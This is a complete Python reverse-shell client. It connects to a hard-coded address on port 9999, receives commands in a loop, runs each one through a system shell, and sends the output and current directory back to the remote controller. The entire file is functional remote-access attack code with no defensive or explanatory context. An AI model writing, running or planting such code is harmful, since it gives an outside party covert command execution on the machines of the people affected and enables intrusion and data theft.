import socket
import os
import subprocess as sub


s = socket.socket()
host = "192.168.43.121"
port = 9999

# Now bind the host and port but it is different in client side
s.connect((host, port))


while True:
    data = s.recv(1024)

    if data[:2].decode('utf-8') == "cd":
        os.chdir(data[3:].decode('utf-8'))

    if len(data) > 0:
        cmd = sub.Popen(data.decode('utf-8'), shell=True, stdout=sub.PIPE, stdin=sub.PIPE, stderr=sub.PIPE)
        output_bite = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bite, "utf-8")
        currentWD = os.getcwd() + ">"
        s.send(str.encode(output_str + currentWD))
        print(output_str)
